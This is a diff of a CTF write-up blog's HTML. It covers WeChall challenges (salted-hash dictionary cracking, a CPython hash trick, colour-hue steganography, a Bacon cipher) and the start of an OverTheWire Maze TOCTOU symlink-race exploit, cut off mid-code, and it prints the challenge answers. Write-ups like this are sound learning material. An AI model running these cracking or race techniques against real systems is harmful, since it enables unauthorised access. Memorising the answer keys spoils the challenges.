salt）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典攻击</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> dictionary:</span><br><span class="line">    <span class="comment"># WC3</span></span><br><span class="line">    h = hashlib.md5(hashlib.md5(word.encode()).hexdigest().encode() + <span class="string">b&quot;zomgsalt&quot;</span>).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> h <span class="keyword">in</span> wc3_hashes:</span><br><span class="line">        found_wc3.append((<span class="built_in">len</span>(word), word))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># WC4 — 每条 hash 的 salt 不同</span></span><br><span class="line">    <span class="keyword">for</span> entry <span class="keyword">in</span> wc4_raw:</span><br><span class="line">        target_hash = entry[:-<span class="number">8</span>]   <span class="comment"># 前 40 hex = SHA1</span></span><br><span class="line">        salt = entry[-<span class="number">8</span>:]          <span class="comment"># 后 8 hex = 4 bytes salt</span></span><br><span class="line">        t = hashlib.sha1(<span class="string">b&quot;zomgsalt4&quot;</span> + word.encode() + <span class="built_in">bytes</span>.fromhex(salt) + <span class="string">b&quot;zomgsalt4&quot;</span>).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == target_hash:</span><br><span class="line">            found_wc4.append((<span class="built_in">len</span>(word), word))</span><br><span class="line"></span><br><span class="line">found_wc3.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">found_wc4.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">answer = <span class="string">f&quot;<span class="subst">&#123;found_wc3[<span class="number">0</span>][<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;found_wc3[<span class="number">1</span>][<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;found_wc4[<span class="number">0</span>][<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;found_wc4[<span class="number">1</span>][<span class="number">1</span>]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
+<p>Key Points:</p>
+<ul>
+<li><strong>WC3 salt 固定</strong>：<code>zomgsalt</code>，追加在第一次
+MD5 hex 之后</li>
+<li><strong>WC4 每条 hash 尾 8 hex 是 salt</strong>：4
+字节随机字母数字，需要按条提取</li>
+<li><strong>所有明文是小写英文词典词</strong></li>
+<li><strong>hash 列表在 页面</strong>：需从
+<code>/en/challenge/wechall/hashing_game/index.php</code> 的 HTML
+中提取</li>
+</ul>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">coincidence,subversion,triangulation,orthography</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1113,691 +1629,6 @@ base 表示的等式。计算结果并以 solution base 表示提交。限时 3.
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-pyhash/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-pyhash/" class="post-title-link" itemprop="url">WeChall - PyHash</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-11 13:59:19 / Modified: 13:59:20" itemprop="dateCreated datePublished" datetime="2026-06-11T13:59:19+08:00">2026-06-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-pyhash/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-pyhash/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>PyHash (Coding, Python) by gizmore 利用 CPython 大整数 hash
-的同余性质绕过哈希检查</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def fly_away(num: int) -&gt; bool:</span><br><span class="line">    return hash(num) == 31337</span><br></pre></td></tr></table></figure>
-<p>要求找一个整数参数使函数返回 <code>True</code>。题面注明测试环境是
-<strong>CPython 64-bit Python 3.10</strong>。</p>
-<h3 id="solution">Solution</h3>
-<p>CPython 对小整数有优化：<code>hash(n) == n</code>。所以直接传
-<code>31337</code> 的话，<code>hash(31337) == 31337</code>
-确实成立——但题面暗示要更大的整数，而且必须用 <code>int</code>，不是
-<code>float</code>。</p>
-<p>关键是大整数的 hash 实现。CPython 用一个固定 modulus 做折叠：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">P = sys.hash_info.modulus  <span class="comment"># 64-bit CPython: 2**61 - 1 = 2305843009213693951</span></span><br></pre></td></tr></table></figure>
-<p>对一个任意大整数 <code>x</code>，<code>hash(x)</code> 近似等于
-<code>x % P</code>（实际还有一步 murmur-style
-mixing，但对这个场景不重要）。因此构造一个与 <code>31337</code> 同余于
-<code>P</code> 的大整数即可：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">P = sys.hash_info.modulus</span><br><span class="line">candidate = <span class="number">31337</span> + P  <span class="comment"># 2305843009213725288</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>(candidate))  <span class="comment"># 31337</span></span><br></pre></td></tr></table></figure>
-<p>完整解法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fly_away</span>(<span class="params">num: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hash</span>(num) == <span class="number">31337</span></span><br><span class="line"></span><br><span class="line">P = sys.hash_info.modulus          <span class="comment"># 2**61 - 1</span></span><br><span class="line">num = <span class="number">31337</span> + P                    <span class="comment"># 2305843009213725288</span></span><br><span class="line"><span class="keyword">assert</span> fly_away(num)               <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(num)                         <span class="comment"># 提交这个数</span></span><br></pre></td></tr></table></figure>
-<p>这个解依赖 CPython 实现细节和 64-bit 平台。32-bit CPython 的 modulus
-是 <code>2**31 - 1</code>，其他 Python implementation（PyPy,
-Jython）可能完全不同。在目标版本（CPython 3.10 64-bit）上验证通过。</p>
-<p>如果 <code>31337 + P</code> 已被别人提交过，就试
-<code>31337 + k * P</code>（k 为任意正整数）——所有同余值都有效。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">2305843009213725288（或 31337 + k * 2305843009213693951）</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-caterpillar/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-training-caterpillar/" class="post-title-link" itemprop="url">WeChall - Training - Caterpillar</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-10 19:47:33 / Modified: 19:49:46" itemprop="dateCreated datePublished" datetime="2026-06-10T19:47:33+08:00">2026-06-10</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-training-caterpillar/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-caterpillar/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>I have drawn a picture of a caterpillar and hid some text in it. I am
-sure you can figure it out, as it is not too hard :)</p>
-<h3 id="solution">Solution</h3>
-<p>下载 <code>caterpillar.png</code>（220x55, RGBA）</p>
-<p>标准 stegano 分析（zsteg, bit plane 扫描, LSB/MSB 全通道）无结果。PNG
-只有 IHDR/sRGB/bKGD/pHYs/IDAT/IEND 六个 chunk，无附加数据。</p>
-<p>数据不在 RGB 裸值里，而是藏在<strong>其他色彩空间的 Hue
-值</strong>中。</p>
-<p>RGB 是加色混色——R, G, B 各 0-255。毛虫的主色是黄绿，以
-RGB(135,194,41) 为例：</p>
-<ul>
-<li>R=135：不在可打印 ASCII 范围（32-126）外，chr(135) 是扩展字符</li>
-<li>G=194：同上，超出范围</li>
-<li>B=41：chr(41) = <code>)</code>，无意义</li>
-</ul>
-<p>直接用 RGB 值当 ASCII 只能得到一堆乱码。</p>
-<h4 id="色彩空间可以互相转换">色彩空间可以互相转换</h4>
-<p>RGB 和 HSV
-描述的是<strong>同一个颜色</strong>，只是坐标系不同——就像经纬度
-(116.4°E, 39.9°N) 和北京市地址是同一地点。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> colorsys</span><br><span class="line"></span><br><span class="line">r, g, b = <span class="number">135</span>, <span class="number">194</span>, <span class="number">41</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RGB -&gt; HSV</span></span><br><span class="line">h, s, v = colorsys.rgb_to_hsv(r/<span class="number">255</span>, g/<span class="number">255</span>, b/<span class="number">255</span>)</span><br><span class="line"><span class="comment"># h = 83° (色相角度), s = 79% (饱和度), v = 76% (明度)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HSV -&gt; RGB (可逆)</span></span><br><span class="line">r2, g2, b2 = colorsys.hsv_to_rgb(h, s, v)</span><br><span class="line"><span class="comment"># (r2,g2,b2) == (135,194,41)  # 无损还原</span></span><br></pre></td></tr></table></figure>
-<p>转换公式是解析的，无精度损失。</p>
-<h4 id="解法">解法</h4>
-<p>毛虫的 8 个主 body segment，每个用了一种特定的颜色。RGB→HSV
-后，H（色相角度）落在可打印 ASCII 范围内：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">segment 1 (x=  0- 22)  #e1f0c9    H=83° -&gt; &#x27;S&#x27;</span><br><span class="line">segment 2 (x= 23- 46)  #e8f4d7    H=85° -&gt; &#x27;U&#x27;</span><br><span class="line">腿阴影   (x= 47- 69)  #6e7d4d    H=79° -&gt; &#x27;O&#x27;</span><br><span class="line">腿阴影   (x= 70- 92)  #465512    H=73° -&gt; &#x27;I&#x27;</span><br><span class="line">segment 3 (x= 93-115)  #a9bb27    H=67° -&gt; &#x27;C&#x27;</span><br><span class="line">segment 4 (x=116-140)  #557315    H=79° -&gt; &#x27;O&#x27;</span><br><span class="line">segment 5 (x=141-165)  #7dad30    H=83° -&gt; &#x27;S&#x27;</span><br><span class="line">segment 6 (x=166-187)  #eaf4d0    H=77° -&gt; &#x27;M&#x27;</span><br><span class="line">头部     (x=188-219)  #e06478    H=350° -&gt; 不可打印 (结束标记)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> colorsys</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;caterpillar.png&#x27;</span>).convert(<span class="string">&#x27;RGBA&#x27;</span>)</span><br><span class="line">w, h = img.size</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐列取最常见的非白色 Hue</span></span><br><span class="line">x_hues = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">    hues = []</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        r, g, b, a = img.getpixel((x, y))</span><br><span class="line">        <span class="keyword">if</span> (r, g, b) == (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        h_val, _, _ = colorsys.rgb_to_hsv(r/<span class="number">255</span>, g/<span class="number">255</span>, b/<span class="number">255</span>)</span><br><span class="line">        hues.append(<span class="built_in">round</span>(h_val * <span class="number">360</span>))</span><br><span class="line">    <span class="keyword">if</span> hues:</span><br><span class="line">        x_hues[x] = Counter(hues).most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并连续相同 Hue 为段，只保留稳定段（&gt;=10 列宽）</span></span><br><span class="line">result = []</span><br><span class="line">run_h, run_start, run_len = <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">    h = x_hues.get(x)</span><br><span class="line">    <span class="keyword">if</span> h == run_h:</span><br><span class="line">        run_len += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> run_len &gt;= <span class="number">10</span> <span class="keyword">and</span> <span class="number">32</span> &lt;= run_h &lt;= <span class="number">126</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>(run_h))</span><br><span class="line">        run_h, run_start, run_len = h, x, <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> run_len &gt;= <span class="number">10</span> <span class="keyword">and</span> <span class="number">32</span> &lt;= run_h &lt;= <span class="number">126</span>:</span><br><span class="line">    result.append(<span class="built_in">chr</span>(run_h))</span><br><span class="line"></span><br><span class="line">decoded = <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Decoded Hue sequence: <span class="subst">&#123;decoded&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Answer (last word):   <span class="subst">&#123;decoded.split()[-<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">COLOR-SHEMES</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-bacon-returns/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-bacon-returns/" class="post-title-link" itemprop="url">WeChall - Training - Bacon Returns</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-10 18:46:47 / Modified: 18:46:49" itemprop="dateCreated datePublished" datetime="2026-06-10T18:46:47+08:00">2026-06-10</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-bacon-returns/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-bacon-returns/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>Mr. Bacon is back with an advanced Bacon cipher. The encoder uses a
-non-standard mapping where the case pattern depends on the letter's
-position in the alphabet (a-m vs n-z), not just uppercase/lowercase.</p>
-<h3 id="solution">Solution</h3>
-<p>从 GitHub 源码 (<code>gizmore/gwf3</code>) 分析编码器逻辑：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bit=0: letter a-m → UPPERCASE (match), n-z → lowercase (skip)</span></span><br><span class="line"><span class="comment">// bit=1: letter n-z → UPPERCASE (match), a-m → lowercase (skip)</span></span><br></pre></td></tr></table></figure>
-<p>解码方法： 1. 遍历 carrier 文本，只看 UPPERCASE 字母 2.
-每个大写字母提取 1 bit：a-m→0, n-z→1 3.
-小写字母是噪声（编码器跳过的位置），忽略 4. 拼接 bit stream，每 5 bit
-一组查 26 字母表（A=00000..Z=11001） 5. X=space</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">letters = [c <span class="keyword">for</span> c <span class="keyword">in</span> encoded_text <span class="keyword">if</span> c.isalpha()]</span><br><span class="line">bits = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> c.lower() &lt; <span class="string">&#x27;n&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> letters <span class="keyword">if</span> c.isupper())</span><br><span class="line">answer = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(bits[i:i+<span class="number">5</span>], <span class="number">2</span>) + <span class="number">65</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">5</span>))</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">OCGMBBNGDAAM</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/OverTheWire/OverTheWire-Maze/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/OverTheWire/OverTheWire-Maze/" class="post-title-link" itemprop="url">OverTheWire - Maze</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-10 15:15:29 / Modified: 15:15:31" itemprop="dateCreated datePublished" datetime="2026-06-10T15:15:29+08:00">2026-06-10</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/OverTheWire/OverTheWire-Maze/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/OverTheWire/OverTheWire-Maze/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="level-0-level-1">level 0 → level 1</h1>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SSH Information</span><br><span class="line">Host: maze.labs.overthewire.org</span><br><span class="line">Port: 2225</span><br><span class="line">User: maze0</span><br><span class="line">Pass: maze0</span><br><span class="line">Passwords: /etc/maze_pass/</span><br><span class="line">Binaries: /maze/</span><br></pre></td></tr></table></figure>
-<p>Maze 是一个侧重 exploitation 技巧的 wargame，难度 5/10，共 9
-关（0-8）。涵盖 TOCTOU race condition、library
-hooking、shellcode、self-modifying code、自定义 ELF 解析、ptrace
-反调试、格式字符串漏洞等。</p>
-<p>所有 binary 均为 32-bit i386 ELF，编译时带 <code>-g</code> debug info
-和 stack protector，nasm/ld 可用，gcc 可用 <code>-m32</code> 编译。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">maze0@maze:~$ <span class="built_in">ls</span> -la /maze/</span><br><span class="line">total 140</span><br><span class="line">-r-sr-x---  1 maze1 maze0 13408 maze0</span><br><span class="line">-r-sr-x---  1 maze2 maze1 12252 maze1</span><br><span class="line">-r-sr-x---  1 maze3 maze2 12708 maze2</span><br><span class="line">-r-sr-x---  1 maze4 maze3  4728 maze3</span><br><span class="line">-r-sr-x---  1 maze5 maze4 16220 maze4</span><br><span class="line">-r-sr-x---  1 maze6 maze5 14884 maze5</span><br><span class="line">-r-sr-x---  1 maze7 maze6 14204 maze6</span><br><span class="line">-r-sr-x---  1 maze8 maze7 14716 maze7</span><br><span class="line">-r-sr-x---  1 maze9 maze8 16324 maze8</span><br></pre></td></tr></table></figure>
-<p>每个 level 的 binary 命名规则：<code>/maze/mazeN</code> 是 setuid
-<code>maze(N+1)</code>，跑在 mazeN 下，目标是读
-<code>/etc/maze_pass/maze(N+1)</code>。</p>
-<p>经典 <strong>TOCTOU (Time-of-check Time-of-use)</strong>
-竞争条件。</p>
-<p>Binary 逻辑（r2 反汇编）：</p>
-<ol type="1">
-<li><code>memset(buf, 0, 0x14)</code> — 清空 20 字节 buffer</li>
-<li><code>access("/tmp/128ecf542a35ac5270a87dc740918404", R_OK)</code> —
-用 real uid (maze0) 检查可读性</li>
-<li>如果 access 失败 → 直接 return</li>
-<li><code>setresuid(maze1, maze1, maze1)</code> — 全部提权到 maze1</li>
-<li><code>open(path, O_RDONLY)</code> → <code>read(fd, buf, 19)</code> →
-<code>write(1, buf, 19)</code> — 读取并输出</li>
-</ol>
-<p>race window 在 access() 和 open()
-之间，只有十几个指令周期。<code>ln -sf</code> 太慢，需要用
-<code>rename()</code> 原子交换预创建的 symlink：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// toggle.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET <span 